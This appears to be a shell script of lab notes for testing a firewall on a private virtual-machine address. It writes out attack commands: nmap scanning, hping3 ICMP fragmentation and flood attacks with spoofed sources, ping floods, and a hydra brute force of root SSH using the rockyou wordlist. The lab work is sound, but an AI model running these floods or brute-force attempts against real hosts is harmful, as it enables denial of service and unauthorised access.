# Focus is on detailled explanation of firewall configuration, not the sophistication of attacks.
sudo su # Make sure you are sudo for all of these commands.

firewall_ip=  192.168.56.101

# Reconissance attacks - Seeing if an attacker can see the services running on web server mainly, also firewall.
## This will take several minutes, scans all ports. Returns open ports, http string and OS information.
nmap -A -p- 192.168.56.101

## UDP scans are pointless due to ssh and http using TCP.


# Packet fragmentation (ICMP flooding attacks)

## Testing strength of packet filter
hping3 -1 -f 192.168.56.101   # -1 uses ICMP, -f fragments packets
hping3 -1 -f -d 1500 192.168.56.101
# You could include --flood in here if you want.

## Deterimental attack (be careful running on limited resources. This WILL nearly crash firewall.
hping3 -1 --flood --rand-source -x -d 1500 192.168.56.101

# Firewall security - Goal is to set up rate limiting.
## Note: May just change this to SSH attacks, in the interest of simplicity and more importantly time.

## Rate limiting interfaces. floods address with traffic.
hping3 --flood 192.168.56.101

## Or we can use plain ping (linux method)
ping -i 0.05 -f 192.168.56.101
## To test timeout, manyally ssh with incorrect credentials
ssh root@192.168.56.101 

## Using hydra to brute force ssh
hydra -l root -t 3 -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.101:22 # You have to extract rockyou on kali, gzip -u /usr/share/wordlists/rockyou.txt.gz

## Using wrk to load test web servers
### -t is threads, -c is connections, -d is duration
wrk -t 4 -c 4 -d 20 http://192.168.56.101

sudo apt install wrk # Wrk is not be installed in kali.

# If apt doesnt work
sudo wget https://archive.kali.org/archive-keyring.gpg -O /usr/share/keyrings/kali-archive-keyring.gpg
sudo apt update
